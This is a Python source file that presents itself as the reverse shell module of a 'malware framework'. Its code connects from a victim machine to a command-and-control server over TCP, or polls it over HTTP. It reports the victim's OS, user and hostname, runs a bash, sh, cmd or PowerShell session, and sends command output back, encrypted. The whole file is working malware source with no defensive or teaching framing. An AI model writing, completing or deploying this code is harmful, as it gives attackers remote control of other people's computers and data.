#!/usr/bin/env python3
"""
Reverse Shell Module for Malware Framework
Provides TCP and HTTP reverse shell capabilities
"""

import socket
import subprocess
import os
import sys
import time
import threading
from typing import Dict, Any, Optional
import logging
import json

from core.base_payload import BasePayload
from core.encryption import EncryptionManager
from core.utils import SystemUtils

logger = logging.getLogger(__name__)

class ReverseShell(BasePayload):
    """Reverse shell payload implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize reverse shell"""
        super().__init__(config)
        self.name = "Reverse Shell"
        self.description = "TCP/HTTP reverse shell with encrypted communication"
        
        # Shell configuration
        self.host = config.get('host', '127.0.0.1')
        self.port = config.get('port', 4444)
        self.protocol = config.get('protocol', 'tcp')  # tcp, http
        self.shell_type = config.get('shell_type', 'auto')  # auto, cmd, powershell, bash
        
        # Communication settings
        self.encryption = EncryptionManager(config.get('encryption', {}))
        self.timeout = config.get('timeout', 30)
        self.reconnect_delay = config.get('reconnect_delay', 5)
        self.max_reconnects = config.get('max_reconnects', -1)  # -1 for infinite
        
        # Shell state
        self.socket = None
        self.process = None
        self.reconnect_count = 0
        
    def _initialize_payload(self) -> None:
        """Initialize reverse shell specific components"""
        # Determine shell type based on OS
        if self.shell_type == 'auto':
            if SystemUtils.is_windows():
                self.shell_type = 'powershell'
            else:
                self.shell_type = 'bash'
        
        logger.info(f"Reverse shell initialized: {self.protocol}://{self.host}:{self.port}")
    
    def execute(self) -> bool:
        """Execute the reverse shell"""
        try:
            if self.protocol == 'tcp':
                return self._execute_tcp_shell()
            elif self.protocol == 'http':
                return self._execute_http_shell()
            else:
                logger.error(f"Unsupported protocol: {self.protocol}")
                return False
        
        except Exception as e:
            logger.error(f"Reverse shell execution failed: {e}")
            return False
    
    def _execute_tcp_shell(self) -> bool:
        """Execute TCP reverse shell"""
        try:
            # Create socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            
            # Connect to C2 server
            logger.info(f"Connecting to {self.host}:{self.port}")
            self.socket.connect((self.host, self.port))
            logger.info("Connected to C2 server")
            
            # Send initial handshake
            handshake = self._create_handshake()
            self._send_data(handshake)
            
            # Start shell
            return self._start_shell()
        
        except Exception as e:
            logger.error(f"TCP shell connection failed: {e}")
            return False
    
    def _execute_http_shell(self) -> bool:
        """Execute HTTP reverse shell"""
        try:
            # HTTP shell implementation
            logger.info("HTTP reverse shell not yet implemented")
            return False
        
        except Exception as e:
            logger.error(f"HTTP shell execution failed: {e}")
            return False
    
    def _create_handshake(self) -> Dict[str, Any]:
        """Create initial handshake message"""
        return {
            'type': 'handshake',
            'payload': 'reverse_shell',
            'version': self.version,
            'os': SystemUtils.get_os_info(),
            'user': SystemUtils.get_current_user(),
            'hostname': SystemUtils.get_hostname(),
            'timestamp': time.time()
        }
    
    def _send_data(self, data: Any) -> bool:
        """Send data to C2 server"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            # Encrypt data if encryption is enabled
            if self.encryption:
                data = self.encryption.encrypt(data)
            
            # Send data length first
            length = len(data)
            self.socket.send(length.to_bytes(4, byteorder='big'))
            
            # Send data
            self.socket.send(data)
            return True
        
        except Exception as e:
            logger.error(f"Failed to send data: {e}")
            return False
    
    def _receive_data(self) -> Optional[bytes]:
        """Receive data from C2 server"""
        try:
            # Receive data length
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            
            length = int.from_bytes(length_data, byteorder='big')
            
            # Receive data
            data = b''
            while len(data) < length:
                chunk = self.socket.recv(min(4096, length - len(data)))
                if not chunk:
                    break
                data += chunk
            
            # Decrypt data if encryption is enabled
            if self.encryption and data:
                data = self.encryption.decrypt(data)
            
            return data
        
        except Exception as e:
            logger.error(f"Failed to receive data: {e}")
            return None
    
    def _start_shell(self) -> bool:
        """Start interactive shell"""
        try:
            # Create shell process
            self.process = self._create_shell_process()
            if not self.process:
                return False
            
            # Start communication threads
            input_thread = threading.Thread(target=self._handle_input, daemon=True)
            output_thread = threading.Thread(target=self._handle_output, daemon=True)
            
            input_thread.start()
            output_thread.start()
            
            # Wait for threads to complete
            input_thread.join()
            output_thread.join()
            
            return True
        
        except Exception as e:
            logger.error(f"Shell execution failed: {e}")
            return False
    
    def _create_shell_process(self) -> Optional[subprocess.Popen]:
        """Create shell process based on OS and shell type"""
        try:
            if SystemUtils.is_windows():
                if self.shell_type == 'powershell':
                    return subprocess.Popen(
                        ['powershell.exe'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        shell=False
                    )
                else:  # cmd
                    return subprocess.Popen(
                        ['cmd.exe'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        shell=False
                    )
            else:
                if self.shell_type == 'bash':
                    return subprocess.Popen(
                        ['/bin/bash'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        shell=False
                    )
                else:  # sh
                    return subprocess.Popen(
                        ['/bin/sh'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        shell=False
                    )
        
        except Exception as e:
            logger.error(f"Failed to create shell process: {e}")
            return None
    
    def _handle_input(self) -> None:
        """Handle input from C2 server to shell"""
        try:
            while self.running and self.process and self.socket:
                # Receive command from C2
                data = self._receive_data()
                if not data:
                    break
                
                try:
                    command = data.decode('utf-8').strip()
                    if not command:
                        continue
                    
                    logger.info(f"Received command: {command}")
                    
                    # Send command to shell
                    if self.process.stdin:
                        self.process.stdin.write(command.encode('utf-8') + b'\n')
                        self.process.stdin.flush()
                
                except Exception as e:
                    logger.error(f"Failed to process command: {e}")
                    break
        
        except Exception as e:
            logger.error(f"Input handler failed: {e}")
    
    def _handle_output(self) -> None:
        """Handle output from shell to C2 server"""
        try:
            while self.running and self.process and self.socket:
                # Read output from shell
                if self.process.stdout:
                    output = self.process.stdout.readline()
                    if not output:
                        break
                    
                    # Send output to C2
                    self._send_data(output)
        
        except Exception as e:
            logger.error(f"Output handler failed: {e}")
    
    def _cleanup(self) -> None:
        """Cleanup shell resources"""
        try:
            # Close socket
            if self.socket:
                self.socket.close()
                self.socket = None
            
            # Terminate shell process
            if self.process:
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.process.kill()
                self.process = None
            
            logger.info("Reverse shell cleanup completed")
        
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get reverse shell status"""
        status = super().get_status()
        status.update({
            'host': self.host,
            'port': self.port,
            'protocol': self.protocol,
            'shell_type': self.shell_type,
            'connected': self.socket is not None,
            'reconnect_count': self.reconnect_count
        })
        return status

class TCPShell(ReverseShell):
    """TCP-specific reverse shell implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        config['protocol'] = 'tcp'
        super().__init__(config)

class HTTPShell(ReverseShell):
    """HTTP-specific reverse shell implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        config['protocol'] = 'http'
        super().__init__(config)
    
    def _execute_http_shell(self) -> bool:
        """Execute HTTP reverse shell with polling"""
        try:
            import requests
            
            base_url = f"http://{self.host}:{self.port}"
            
            while self.running:
                try:
                    # Poll for commands
                    response = requests.get(f"{base_url}/poll", timeout=self.timeout)
                    if response.status_code == 200:
                        command = response.text.strip()
                        if command:
                            # Execute command
                            result = self._execute_command(command)
                            
                            # Send result back
                            requests.post(f"{base_url}/result", data=result)
                    
                    # Sleep between polls
                    time.sleep(self.reconnect_delay)
                
                except requests.RequestException as e:
                    logger.error(f"HTTP request failed: {e}")
                    time.sleep(self.reconnect_delay)
            
            return True
        
        except Exception as e:
            logger.error(f"HTTP shell execution failed: {e}")
            return False
    
    def _execute_command(self, command: str) -> str:
        """Execute a single command and return result"""
        try:
            if SystemUtils.is_windows():
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            return result.stdout + result.stderr
        
        except Exception as e:
            return f"Error executing command: {e}" 